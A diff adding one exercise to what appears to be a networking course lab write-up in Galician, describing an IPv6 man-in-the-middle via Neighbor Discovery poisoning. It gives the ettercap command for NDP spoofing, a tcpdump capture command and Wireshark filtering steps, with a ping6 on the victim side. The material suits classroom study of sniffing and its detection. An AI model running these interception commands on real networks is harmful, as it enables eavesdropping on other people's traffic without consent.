@@ -335,6 +335,20 @@
 
 ### **8.-Haga un MITM en IPv6 y visualice la paquetería**
 
+Para facer un MITM en IPV6 vamos a facelo a través de ndp (Neighbor Discovery Protocol -> protocolo de IPv6). Non se fai con arp xa que non funciona por IPv6
+
+* **ATACANTE:**
+
+   1º)Executamos ettercap -> `ettercap -i ens33 -T -M ndp:remote //IPv6_compa/ /10.11.48.1//`.
+
+   2º)En paralelo capturamos a paqueteria -> `tcpdump -i ens33 -s 65535 -w mitmipv6.pcap`
+
+   3º)Analiamos en Wireshark a paqueteria da víctima. Nese archivo, filtramos en Wireshark poñendo 'ipv6' e tendria que aparecer paquetes tipo ICMPv6 que son de ping6
+
+* **VÍCTIMA:**
+
+   1º)Executa unhas cuantas veces un ping6, p.e-> `ping6 -c 2 -I ens33 ff02::1`
+
 
 
 ### **9.-Pruebe alguna herramienta y técnica de detección del sniffing (preferiblemente arpon).**
